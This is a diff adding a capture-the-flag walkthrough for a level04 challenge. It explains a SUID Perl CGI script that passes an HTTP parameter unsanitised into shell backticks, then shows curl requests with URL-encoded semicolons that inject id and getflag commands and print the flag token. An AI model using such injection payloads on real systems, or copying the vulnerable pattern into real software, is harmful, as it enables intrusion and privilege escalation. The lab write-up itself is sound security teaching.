@@ -1,0 +1,80 @@
+From the level04 account, the goal was to execute getflag with the privileges of the flag04 account.
+
+The home directory contained a Perl script:
+
+level04.pl
+
+I inspected its permissions:
+
+ls -la
+
+Interesting line:
+
+-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
+
+The `s` bits show that the script is SUID and SGID.
+The owner is flag04, so it is interesting for privilege escalation.
+
+I read the script:
+
+cat level04.pl
+
+Content:
+
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+
+The script uses CGI and reads the HTTP parameter named `x`:
+
+param("x")
+
+Then it passes that value into a shell command executed with Perl backticks:
+
+print `echo $y 2>&1`;
+
+In Perl, backticks execute a shell command and return its output.
+Since `$y` comes directly from user input and is inserted into the shell command without sanitization, this is a command injection vulnerability.
+
+The comment indicated that the script was exposed locally on port 4747:
+
+# localhost:4747
+
+I first tested normal behavior:
+
+curl 'http://localhost:4747/?x=test'
+
+Output:
+
+test
+
+Then I tested command injection with an URL-encoded semicolon.
+The semicolon must be encoded as `%3B` because `;` can be treated specially in URLs.
+
+curl 'http://localhost:4747/?x=test%3Bid'
+
+Output:
+
+test
+uid=3004(flag04) gid=2004(level04) groups=3004(flag04),1001(flag),2004(level04)
+
+This confirmed that injected commands run with flag04 privileges.
+
+Finally, I injected getflag:
+
+curl 'http://localhost:4747/?x=test%3B/bin/getflag'
+
+Output:
+
+test
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+
+Token obtained to access the next level:
+
+ne2searoevaevoem4ov4ar8ap
